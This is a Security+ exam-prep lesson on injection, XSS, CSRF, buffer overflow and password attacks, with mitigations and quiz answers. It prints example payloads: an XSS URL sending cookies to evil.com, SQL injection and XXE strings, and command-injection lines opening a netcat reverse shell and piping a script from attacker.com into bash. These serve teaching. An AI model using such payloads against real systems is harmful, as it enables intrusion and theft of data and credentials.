# Lesson 10: Application and Password Attacks

**Estimated Time:** 30-35 minutes  
**Domain:** 2.0 Threats, Vulnerabilities, and Mitigations (22% of exam)  
**Exam Objectives Covered:** 2.2 - Explain common threat vectors and attack surfaces

---

## Learning Objectives

By the end of this lesson, you will be able to:
- Explain SQL injection attacks and how parameterized queries prevent them
- Differentiate between reflected, stored, and DOM-based cross-site scripting (XSS)
- Describe cross-site request forgery (CSRF) and its mitigations
- Identify other injection attacks (command, LDAP, XML)
- Explain buffer overflow attacks and memory safety concepts
- Differentiate password attacks: brute force, dictionary, spraying, credential stuffing
- Describe rainbow table attacks and why salting defeats them
- Apply appropriate mitigations for application and password attacks

---

## Video Resources

- **Professor Messer:** "Security+ SY0-701 - Application Attacks" (14 min)
- **Computerphile:** "SQL Injection Explained" (10 min)
- **PowerCert:** "Password Attacks Explained" (12 min)

---

## Introduction

In 2017, Equifax disclosed a breach affecting 147 million people—nearly half the US population. Names, Social Security numbers, birth dates, addresses, and driver's license numbers stolen. The impact was catastrophic: identity theft, fraudulent accounts, years of damage.

The attack vector? A vulnerability in Apache Struts, a web application framework. The specific weakness allowed attackers to inject commands through web requests. One unpatched server. One injection vulnerability. 147 million victims.

Application attacks target the software layer—the code that processes user input, queries databases, and generates web pages. Unlike network attacks that exploit protocols, application attacks exploit programming mistakes. And these mistakes are everywhere.

OWASP (Open Web Application Security Project) tracks the most critical web application vulnerabilities. Injection attacks have dominated their Top 10 for over a decade. Why? Because developers repeatedly make the same mistakes: trusting user input, concatenating strings into queries, failing to validate and sanitize.

Password attacks remain equally persistent. Despite decades of security advice, weak passwords protect critical systems. Password reuse means one breach compromises many accounts. Credential stuffing attacks automate testing stolen credentials across thousands of sites.

Understanding these attacks is essential for both offense (penetration testing) and defense (secure development, configuration). The patterns repeat across applications—learn them once, recognize them everywhere.

---

## Injection Attacks

Injection attacks insert malicious data that's interpreted as code by backend systems.

### The Core Problem

Applications often construct commands by combining code with user input:

```sql
query = "SELECT * FROM users WHERE name = '" + username + "'"
```

If `username` is `john`, query becomes:
```sql
SELECT * FROM users WHERE name = 'john'
```

But if `username` is `' OR '1'='1`, query becomes:
```sql
SELECT * FROM users WHERE name = '' OR '1'='1'
```

The `OR '1'='1'` is always true—query returns ALL users. The attacker's input changed the query's logic.

This pattern—user input interpreted as code—underlies all injection attacks.

---

## SQL Injection (SQLi)

SQL injection inserts malicious SQL statements through user input fields.

### Attack Types

**In-Band SQLi (Classic)**

Results returned directly in application response.

- **Error-based:** Cause database errors that reveal information
- **UNION-based:** Use UNION to append additional queries, extract data

**Example:** Login bypass
```
Username: admin' --
Password: anything
```
Query becomes:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```
The `--` comments out password check. Attacker logs in as admin.

**Blind SQLi**

No direct output—attacker infers information from application behavior.

- **Boolean-based:** Different responses for true/false conditions
- **Time-based:** Measure response delays to extract data bit by bit

**Example:** Time-based extraction
```sql
' OR IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
```
If password starts with 'a', response delayed 5 seconds. Attacker tests each character.

**Out-of-Band SQLi**

Data exfiltrated through different channel (DNS, HTTP requests to attacker server).

Used when in-band techniques don't work.

### SQL Injection Impact

- **Authentication bypass:** Login without credentials
- **Data theft:** Extract entire database contents
- **Data modification:** Change prices, permissions, records
- **Data deletion:** Drop tables, destroy data
- **Command execution:** Some databases allow OS command execution

### SQL Injection Prevention

**Parameterized Queries (Prepared Statements)**

Separate code from data—user input never interpreted as SQL.

**Vulnerable:**
```python
query = "SELECT * FROM users WHERE id = " + user_id
```

**Safe:**
```python
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_id,))
```

Database treats parameter as data, not code—even malicious input can't change query structure.

**Additional defenses:**
- Input validation (whitelist allowed characters)
- Least privilege database accounts
- WAF (Web Application Firewall)
- Error handling (don't expose database errors)

---

## Command Injection

Insert operating system commands through application input.

### How It Works

Application executes OS commands using user input:

```python
os.system("ping " + user_input)
```

Normal input: `192.168.1.1`
Command: `ping 192.168.1.1`

Malicious input: `192.168.1.1; cat /etc/passwd`
Command: `ping 192.168.1.1; cat /etc/passwd`

The semicolon terminates first command, executes second.

### Command Injection Operators

| Operator | Function | Example |
|----------|----------|---------|
| `;` | Command separator | `cmd1; cmd2` |
| `&&` | Run if first succeeds | `cmd1 && cmd2` |
| `\|\|` | Run if first fails | `cmd1 \|\| cmd2` |
| `\|` | Pipe output | `cmd1 \| cmd2` |
| `` ` `` | Command substitution | `` `cmd` `` |
| `$()` | Command substitution | `$(cmd)` |

### Prevention

- Avoid calling OS commands with user input
- Use language-native functions instead of shell commands
- Input validation (strict whitelist)
- Parameterized command execution where available

---

## Other Injection Types

### LDAP Injection

Manipulate LDAP queries to bypass authentication or extract directory data.

**Vulnerable query:**
```
(&(user=USER_INPUT)(password=PASS_INPUT))
```

**Attack input:** `*)(|(&`
Can alter query logic, bypass authentication, enumerate users.

### XML Injection / XXE (XML External Entity)

Inject malicious XML to read files, cause DoS, or execute server-side requests.

**XXE example:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
```

Server includes contents of /etc/passwd in response.

### Prevention for All Injection

**Universal principle:** Never trust user input. Validate, sanitize, parameterize.

- Input validation (whitelist valid characters/formats)
- Output encoding (prevent interpretation)
- Parameterized queries/commands
- Least privilege
- WAF as defense-in-depth

---

## Cross-Site Scripting (XSS)

XSS injects malicious scripts into web pages viewed by other users.

### The Core Problem

Application includes user input in HTML output without proper encoding:

```html
<p>Welcome, USER_INPUT!</p>
```

If input is `<script>alert('XSS')</script>`, browser executes the script.

### XSS Types

**Reflected XSS**

Malicious script in request is immediately reflected in response.

**Attack flow:**
1. Attacker crafts URL with malicious script in parameter
2. Victim clicks link (via phishing, social media)
3. Server includes script in response page
4. Victim's browser executes script

**Example URL:**
```
https://site.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

**Stored (Persistent) XSS**

Malicious script saved on server, served to all users viewing the content.

**Attack flow:**
1. Attacker posts malicious script (comment, profile, message)
2. Server stores the script
3. Other users view the page
4. Script executes in every victim's browser

**More dangerous:** Affects all visitors, no phishing required.

**DOM-Based XSS**

Script manipulates DOM (Document Object Model) client-side.

- Vulnerability is in client-side JavaScript
- Server may never see the malicious payload
- Payload often in URL fragment (#) not sent to server

### XSS Impact

- **Session hijacking:** Steal session cookies
- **Credential theft:** Fake login forms
- **Defacement:** Modify page content
- **Malware distribution:** Redirect to malicious sites
- **Keylogging:** Capture user input

### XSS Prevention

**Output Encoding**

Convert special characters to HTML entities:
- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `"` becomes `&quot;`

Browser displays characters rather than interpreting as HTML.

**Content Security Policy (CSP)**

HTTP header restricting script sources:
```
Content-Security-Policy: script-src 'self'
```
Only scripts from same origin execute—blocks inline scripts.

**Input Validation**

Whitelist acceptable input—reject or sanitize others.

**HTTPOnly Cookies**

```
Set-Cookie: session=abc123; HttpOnly
```
JavaScript cannot access cookie—limits session hijacking.

---

## Cross-Site Request Forgery (CSRF)

CSRF tricks authenticated users into performing unintended actions.

### How CSRF Works

1. User logs into bank, receives session cookie
2. User visits malicious site (still logged into bank)
3. Malicious site contains hidden request to bank
4. Browser automatically includes bank's session cookie
5. Bank sees authenticated request, executes action

**Example malicious page:**
```html
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```

Just loading the image triggers the transfer request with victim's cookies.

### CSRF vs. XSS

| Aspect | XSS | CSRF |
|--------|-----|------|
| Attack target | Client (browser) | Server (via client) |
| Exploits | Trust site has in browser | Trust server has in browser |
| Requires | Script execution | Authenticated session |
| Attacker sees | Response data | Nothing (blind) |

### CSRF Prevention

**Anti-CSRF Tokens**

Include unique, unpredictable token in forms:
```html
<input type="hidden" name="csrf_token" value="random123">
```

Server validates token matches user's session. Attacker can't predict valid token.

**SameSite Cookies**

```
Set-Cookie: session=abc; SameSite=Strict
```
- `Strict`: Cookie not sent with any cross-site requests
- `Lax`: Cookie sent with navigation, not other requests

**Referer Validation**

Check that request originated from same site.

---

## Buffer Overflow Attacks

Buffer overflow writes data beyond allocated memory boundaries.

### How It Works

Program allocates fixed buffer for input:
```c
char buffer[10];
strcpy(buffer, user_input);  // No length check!
```

If `user_input` is 50 characters, 40 characters overflow into adjacent memory.

### Exploitation

Adjacent memory may contain:
- Other variables (change program state)
- Return addresses (control execution flow)
- Function pointers (execute arbitrary code)

**Classic stack overflow:**
1. Overflow buffer with malicious code + new return address
2. Overwritten return address points to malicious code
3. When function returns, executes attacker's code

### Buffer Overflow Mitigations

**Language choice:**
- Memory-safe languages (Python, Java, Go, Rust) prevent classic overflows
- C/C++ require careful coding

**Compiler protections:**
- **Stack canaries:** Detect buffer overflow before return
- **ASLR (Address Space Layout Randomization):** Randomize memory locations
- **DEP/NX (Data Execution Prevention):** Mark memory non-executable

**Secure coding:**
- Bounds checking on all input
- Use safe functions (`strncpy` vs `strcpy`)
- Input validation

---

## Race Conditions

Race conditions occur when outcome depends on timing of events.

### TOCTOU (Time-of-Check to Time-of-Use)

Program checks condition, then acts on it—but condition changes between check and use.

**Example:**
1. Program checks: Is user authorized to read file?
2. Attacker replaces file with symlink to sensitive file
3. Program reads (now different) file

**Between check and use**, attacker changed what file refers to.

### Prevention

- Atomic operations (check and use in single step)
- Locking mechanisms
- Minimize time between check and use
- Use file handles rather than paths

---

## Password Attacks

Password attacks attempt to discover credentials.

### Brute Force

Try every possible combination systematically.

**Characteristics:**
- Guaranteed success eventually
- Time depends on password complexity
- Computationally expensive

**Math:** 8-character password, lowercase only = 26^8 = 208 billion combinations

**Against online systems:** Very slow, easily detected, rate-limited.

**Against offline hashes:** Fast if weak hashing (billions per second with GPUs).

### Dictionary Attack

Try common words and passwords from lists.

**Characteristics:**
- Faster than brute force
- Effective against weak passwords
- Uses known-weak passwords from previous breaches

**Common lists:**
- rockyou.txt (14 million passwords from breach)
- Common passwords: "password", "123456", "qwerty"
- Wordlists with common substitutions

### Hybrid Attack

Combine dictionary words with variations.

**Examples:**
- `password` → `Password1!`
- `summer` → `Summer2024`
- Add numbers, special characters, capitalize

Effective because people follow predictable patterns.

### Password Spraying

Try few common passwords against many accounts.

**Traditional:** Many passwords against one account (triggers lockout)

**Spraying:** Few passwords against many accounts (avoids lockout)

**Example:** Try "Summer2024!" against all 10,000 employees. A few will use it.

**Why it works:**
- Stays below lockout thresholds
- Common passwords exist in every organization
- Often uses seasonal patterns (season + year)

### Credential Stuffing

Test stolen username/password pairs across multiple sites.

**Attack flow:**
1. Obtain credentials from breach (millions available)
2. Automate testing against target sites
3. Password reuse means many credentials work

**Scale:** Billions of credentials in breach databases. Automated testing at massive scale.

**Why it works:** People reuse passwords. Credential from breached Site A works on Site B.

### Rainbow Table Attack

Precomputed table of hashes for password lookup.

**How it works:**
1. Compute hashes of millions of passwords
2. Store as hash → password lookup table
3. Given captured hash, look up password instantly

**Advantage:** No computation at attack time—just lookup.

**Disadvantage:** Huge storage (terabytes for comprehensive tables).

### Defeating Rainbow Tables: Salting

Add random value (salt) before hashing.

**Without salt:**
```
hash("password") = 5f4dcc3b5aa765d61d8327deb882cf99
```
Same password always produces same hash—rainbow table works.

**With salt:**
```
hash("randomsalt" + "password") = 67a12f0c...
hash("differentsalt" + "password") = 9b3e21a8...
```

Same password produces different hash with different salt. Attacker would need rainbow table for every possible salt—impractical.

**Modern password storage:**
- Unique salt per password
- Salt stored with hash (not secret)
- Slow hash function (bcrypt, Argon2)

---

## Password Attack Mitigations

### For Users
- Long, unique passwords for each account
- Password managers
- Multi-factor authentication
- Check breach databases (haveibeenpwned.com)

### For Systems
- Strong hashing (bcrypt, Argon2, PBKDF2)
- Salting
- Account lockout (careful: enables DoS)
- Rate limiting
- MFA requirement
- Password complexity policies
- Breach detection (check against known compromised passwords)

---

## Key Exam Tips

🎯 **SQL injection prevention:** Parameterized queries (prepared statements). Not input filtering alone.

🎯 **XSS types:** Reflected = in URL, immediate. Stored = saved on server, affects all viewers. DOM = client-side JavaScript.

🎯 **CSRF:** Tricks authenticated user. Anti-CSRF tokens, SameSite cookies.

🎯 **XSS vs CSRF:** XSS executes script in victim's browser. CSRF makes authenticated request on victim's behalf.

🎯 **Buffer overflow:** Write beyond allocated memory. Mitigations: ASLR, DEP/NX, stack canaries.

🎯 **Password spraying vs brute force:** Spraying = few passwords against many accounts. Brute force = many passwords against one account.

🎯 **Credential stuffing:** Automated testing of breached credentials across sites. Exploits password reuse.

🎯 **Rainbow tables:** Precomputed hash tables. Defeated by salting.

🎯 **Salting:** Random value added before hashing. Different salt = different hash for same password.

---

## Key Takeaways

- [ ] Injection attacks insert malicious data interpreted as code by backend systems
- [ ] SQL injection manipulates database queries; prevented by parameterized queries
- [ ] Command injection executes OS commands; avoid user input in system calls
- [ ] Reflected XSS is in request/response; stored XSS is saved and affects all viewers
- [ ] XSS steals sessions, credentials; mitigated by output encoding, CSP, HTTPOnly cookies
- [ ] CSRF tricks authenticated users; mitigated by anti-CSRF tokens and SameSite cookies
- [ ] Buffer overflow writes beyond memory boundaries; mitigated by ASLR, DEP, stack canaries
- [ ] TOCTOU race conditions exploit time gap between check and use
- [ ] Brute force tries all combinations; dictionary uses common passwords
- [ ] Password spraying tries few passwords against many accounts to avoid lockout
- [ ] Credential stuffing tests stolen credentials across sites; exploits password reuse
- [ ] Rainbow tables are precomputed hash lookups; salting defeats them
- [ ] Salts are unique per password; slow hashes (bcrypt, Argon2) resist cracking

---

## Check Your Understanding

**1. A web application login form is vulnerable. Entering `admin' --` as the username logs in as admin regardless of password. What attack is this, and why does it work?**

<details>
<summary>Show Answer</summary>
<strong>SQL injection—specifically authentication bypass.</strong>

<strong>Why it works:</strong>

Original query likely:
```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
```

With `admin' --` as username:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```

The `'` closes the username string. The `--` comments out the rest of the query (password check). Query finds admin user, application logs attacker in.

<strong>Prevention:</strong>
```python
# Use parameterized query
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
```

With parameterized queries, `admin' --` is treated as literal username string, not SQL code.
</details>

**2. A user clicks a link in an email. The URL contains a script that executes in their browser when the page loads, stealing their session cookie. Later, a pentester finds the same vulnerability but the payload is stored in a comment field, affecting all users who view the page. What type of attack is each scenario?**

<details>
<summary>Show Answer</summary>
<strong>First scenario: Reflected XSS</strong>
- Malicious script in URL
- Reflected immediately in response
- Affects only users who click the specific link
- Requires social engineering (phishing) to distribute

<strong>Second scenario: Stored (Persistent) XSS</strong>
- Malicious script saved on server (in comment)
- Affects all users who view the page
- No phishing needed—normal site visitors affected
- More severe because of broader impact

<strong>Key difference:</strong>
- Reflected: Script in request, reflected back once
- Stored: Script saved, served to everyone

<strong>Both prevented by:</strong>
- Output encoding (escape special characters)
- Content Security Policy
- HTTPOnly cookies (limit session theft)
- Input validation
</details>

**3. A user is logged into their banking site. They then visit a malicious website that contains a hidden form submitting a transfer request to the bank. The transfer succeeds. What attack is this, and why did it work?**

<details>
<summary>Show Answer</summary>
<strong>Cross-Site Request Forgery (CSRF).</strong>

<strong>Why it worked:</strong>
1. User authenticated to bank (has session cookie)
2. Malicious site triggers request to bank
3. Browser automatically attaches bank's session cookie
4. Bank sees valid session, executes transfer
5. Bank can't distinguish legitimate request from forged one

<strong>The vulnerability:</strong> Bank trusts any request with valid session cookie. No verification that user intended to make that specific request.

<strong>Prevention:</strong>
- Anti-CSRF tokens (unpredictable token in forms, validated on server)
- SameSite=Strict cookies (not sent with cross-site requests)
- Require re-authentication for sensitive actions
- Verify Referer header

<strong>Key insight:</strong> This isn't stealing credentials—it's using the victim's existing authenticated session.
</details>

**4. An attacker has obtained a database dump containing password hashes. The hashes are unsalted MD5. The attacker recovers 80% of passwords within minutes using a precomputed table. What technique was used, and how would salting have helped?**

<details>
<summary>Show Answer</summary>
<strong>Rainbow table attack.</strong>

<strong>How it worked:</strong>
1. Rainbow tables contain precomputed hash → password mappings
2. MD5 is fast, widely used—comprehensive tables exist
3. Unsalted = same password = same hash everywhere
4. Simple lookup: Find hash in table, get password
5. 80% recovered because common passwords all in tables

<strong>How salting would have helped:</strong>
1. Each password hashed with unique random salt
2. "password" + salt1 ≠ "password" + salt2
3. Attacker would need rainbow table for every possible salt
4. For 16-byte salt: 2^128 possible tables needed
5. Computationally infeasible—rainbow tables useless

<strong>Proper password storage:</strong>
- Unique salt per password
- Slow hash (bcrypt, Argon2, scrypt)—not MD5
- Salt stored with hash (not secret)

<strong>Why MD5 is bad:</strong> Fast = more guesses per second. Use intentionally slow hashes for passwords.
</details>

**5. A security team notices thousands of failed login attempts across many user accounts, but only 3-4 attempts per account. No accounts are locked out. What attack is this, and why is it structured this way?**

<details>
<summary>Show Answer</summary>
<strong>Password spraying attack.</strong>

<strong>Why structured this way:</strong>
- Most systems lock accounts after 5-10 failed attempts
- Spraying stays below threshold (3-4 attempts per account)
- Tries common passwords: "Summer2024!", "Company123", "Welcome1"
- Even 0.1% success rate = dozens of compromised accounts

<strong>Attack logic:</strong>
- Traditional brute force: Many passwords against one account → lockout
- Password spraying: Few passwords against many accounts → no lockout

<strong>Detection challenges:</strong>
- No single account shows suspicious activity
- Need to correlate across all accounts
- Pattern: Same passwords tried across many accounts

<strong>Mitigations:</strong>
- Monitor for spraying patterns (same password, many accounts)
- Implement organization-wide lockout (not just per account)
- Require MFA
- Ban common passwords at creation time
- Alert on distributed failed login patterns
</details>

**6. Following a breach at a retail site, attackers successfully access accounts on banking sites, email providers, and social media using the same credentials. Victims used unique passwords for the retail site. What attack is this, and what assumption were attackers making?**

<details>
<summary>Show Answer</summary>
<strong>Credential stuffing attack.</strong>

<strong>Wait—there's a problem with the question.</strong>

If victims used unique passwords for the retail site, credential stuffing shouldn't work on other sites. The question contains a contradiction.

<strong>Credential stuffing assumes password reuse:</strong>
- Stolen retail credentials tested on other sites
- Works ONLY if users reused passwords
- "Unique passwords" means attack should fail

<strong>What likely happened:</strong>
- Victims thought passwords were unique but had reused them
- Or they used similar passwords (Password1! → Password2!)
- Attackers may have also obtained credentials from multiple breaches

<strong>Correct understanding of credential stuffing:</strong>
1. Obtain credentials from breach
2. Automate testing across many sites
3. Exploits password reuse
4. Even small success rate = thousands of compromised accounts

<strong>Prevention:</strong>
- Don't reuse passwords (password manager)
- Enable MFA everywhere
- Services: Detect stuffing patterns, check against breach databases
</details>

**7. A web application vulnerability scanner reports "potential command injection" on a form field. The application uses that field in a system call to ping a user-provided IP address. How would an attacker exploit this, and what should the developer do?**

<details>
<summary>Show Answer</summary>
<strong>Command injection exploitation:</strong>

Vulnerable code might be:
```python
os.system("ping " + user_ip)
```

<strong>Attack payloads:</strong>
```
; cat /etc/passwd
| nc attacker.com 4444 -e /bin/bash
&& curl http://attacker.com/shell.sh | bash
```

**Example:** Input `8.8.8.8; whoami`
Command becomes: `ping 8.8.8.8; whoami`
Both commands execute—attacker learns running user.

<strong>Developer fixes:</strong>

<strong>Best: Avoid system calls</strong>
```python
import subprocess
# Use library instead of shell command
subprocess.run(['ping', '-c', '4', user_ip], capture_output=True)
```

<strong>If must use system calls:</strong>
1. Strict input validation (whitelist IP format only)
2. Use parameterized execution
3. Never pass user input directly to shell
4. Escape/sanitize all special characters

<strong>Validation example:</strong>
```python
import re
if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', user_ip):
    # Only proceed if valid IP format
```
</details>

**8. An organization's password policy requires 8+ characters, uppercase, lowercase, number, and symbol. Despite this, passwords are being cracked quickly from stolen hashes. What's likely wrong with the password storage?**

<details>
<summary>Show Answer</summary>
<strong>Likely issues:</strong>

<strong>1. Weak hashing algorithm (most likely)</strong>
- Using MD5 or SHA1 (fast = bad for passwords)
- Attackers can test billions per second with GPUs
- Even complex passwords fall to brute force

<strong>2. No salting</strong>
- Same password = same hash
- Rainbow tables work
- Attackers crack one, get all users with same password

<strong>3. Insufficient iterations (if using PBKDF2)</strong>
- Too few iterations = too fast
- Should be tuned for ~100ms per hash

<strong>Policy vs. storage:</strong>
- Password complexity policy protects against guessing
- Hash strength protects against offline cracking
- Both are needed

<strong>Correct implementation:</strong>
```python
# bcrypt with proper cost factor
import bcrypt
hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
```

<strong>bcrypt/Argon2 advantages:</strong>
- Intentionally slow
- Built-in salting
- Configurable work factor
- GPU-resistant (Argon2)
</details>

**9. A buffer overflow is discovered in a network service. The development team argues that ASLR and DEP are enabled, so exploitation is unlikely. Is this reasoning correct?**

<details>
<summary>Show Answer</summary>
<strong>Partially correct—but not completely safe.</strong>

<strong>What ASLR does:</strong>
- Randomizes memory layout at each execution
- Attacker can't predict where code/data will be
- Makes exploitation harder (can't hardcode addresses)

<strong>What DEP/NX does:</strong>
- Marks data memory as non-executable
- Can't execute shellcode placed in buffer
- Prevents classic code injection

<strong>Why still vulnerable:</strong>

<strong>1. Information leaks defeat ASLR</strong>
- Separate vulnerability may reveal addresses
- One leak can enable exploitation

<strong>2. Return-Oriented Programming (ROP) defeats DEP</strong>
- Chain existing code snippets ("gadgets")
- Executable code, so DEP doesn't block
- Complex but well-documented technique

<strong>3. Implementation weaknesses</strong>
- Partial ASLR (some areas not randomized)
- 32-bit systems: Limited entropy, brute-forceable
- Some libraries loaded at fixed addresses

<strong>Correct approach:</strong>
- Fix the vulnerability (bounds checking)
- ASLR/DEP are mitigations, not fixes
- Defense in depth—don't rely on single control
- Memory-safe languages prevent the bug class entirely
</details>

**10. What is the fundamental difference between XSS and CSRF attacks, and why do they require different mitigations?**

<details>
<summary>Show Answer</summary>
<strong>Fundamental difference:</strong>

| Aspect | XSS | CSRF |
|--------|-----|------|
| Trust exploited | Site trusts user's browser | Site trusts authenticated user |
| Attack mechanism | Execute attacker's script | Execute attacker's request |
| Attacker gains | Access to page content, cookies | Perform actions as victim |
| Script execution | Yes (core of attack) | No (just triggers request) |

<strong>XSS:</strong> "I can run my code in your browser viewing this site."
- Exploits application including untrusted data in pages
- Attacker's script runs with page's privileges
- Can steal data, modify page, capture input

<strong>CSRF:</strong> "I can make your browser send requests you didn't intend."
- Exploits browser automatically sending cookies
- Attacker can't see response (same-origin policy)
- Limited to actions, not data theft

<strong>Why different mitigations:</strong>

<strong>XSS mitigations target script execution:</strong>
- Output encoding (prevent script interpretation)
- CSP (restrict script sources)
- HTTPOnly cookies (limit script's access to cookies)

<strong>CSRF mitigations verify request intent:</strong>
- Anti-CSRF tokens (prove request came from legitimate form)
- SameSite cookies (don't send cookies cross-site)
- Not about scripts at all

<strong>Key insight:</strong> Anti-CSRF tokens don't prevent XSS. Output encoding doesn't prevent CSRF. Each addresses different trust relationship.
</details>

---

## Next Lesson Preview

In **Lesson 11: Vulnerability Types**, we'll examine the different categories of vulnerabilities that exist in systems and applications. You'll learn about memory vulnerabilities, configuration vulnerabilities, cryptographic weaknesses, and the vulnerability lifecycle from discovery through remediation.

---

✅ **Lesson 10 Complete**

**Progress:** 10 of 30 lessons complete (33.3%)

---

*Next up: Lesson 11 - Vulnerability Types*